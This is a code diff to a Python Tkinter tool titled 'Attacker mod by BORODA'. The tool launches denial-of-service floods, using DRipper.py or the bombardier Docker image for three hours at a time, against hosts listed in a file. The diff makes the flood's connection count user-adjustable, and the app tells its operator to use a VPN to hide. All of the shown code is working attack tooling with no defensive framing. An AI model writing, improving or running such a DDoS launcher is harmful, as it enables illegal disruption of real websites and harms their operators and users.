@@ -36,22 +36,11 @@ def get_ip(host):
 processes = []
 app = tk.Tk()
 app.title("Attacker mod by BORODA")
-app.geometry('300x300')
+app.geometry('300x400')
 
-message = tk.StringVar(app)
-label = tk.Label(app, textvariable=message)
+connectionCount = tk.StringVar(app)
+label = tk.Label(app, text="Better use vpn before running this app")
 label.pack()
-
-message.set("Better use vpn before running this app")
-
-hosts = open("hosts.txt", "r")
-data = hosts.read()
-hosts.close()
-
-text = tk.Text(app, height=17, width=152)
-text.insert(1.0, data)
-
-proc = None
 
 
 def start():
@@ -86,7 +75,7 @@ def stop():
 
 
 def run_ripper(ip, port):
-    cmd = f'python3 DRipper.py --quiet -s {ip} -t 135 -p {port}'
+    cmd = f'python3 DRipper.py --quiet -s {ip} -t {connectionCount.get()} -p {port}'
     sub = subprocess.Popen(cmd, shell=True)
     processes.append(sub)
 
@@ -97,7 +86,7 @@ def run_docker(ip, port):
         prefix = "http://"
     print(f"Starting bombardier to: {prefix}{ip}:{port}")
     client = docker.from_env()
-    container = client.containers.create("alpine/bombardier", f"-c 135 -d 10800s -l {prefix}{ip}:{port}")
+    container = client.containers.create("alpine/bombardier", f"-c {connectionCount.get()} -d 10800s -l {prefix}{ip}:{port}")
     container.start()
     processes.append(container)
 
@@ -108,12 +97,23 @@ radio1.select()
 radio2 = tk.Radiobutton(app, text="Bombardier (Docker)", variable=radioSelector, value=1)
 radio2.pack(side=tk.TOP)
 
+tk.Label(app, text="Connection count:").pack()
+tk.Entry(app, width=8, textvariable=connectionCount).pack()
+connectionCount.set("135")
 
 btn = tk.Button(app, text='Start', bd='5', command=start)
 btn.pack(side='top')
 
 btn = tk.Button(app, text='Stop', bd='5', command=stop)
 btn.pack(side='top')
+
+
+hosts = open("hosts.txt", "r")
+data = hosts.read()
+hosts.close()
+
+text = tk.Text(app, height=17, width=152)
+text.insert(1.0, data)
 
 text.pack()
 
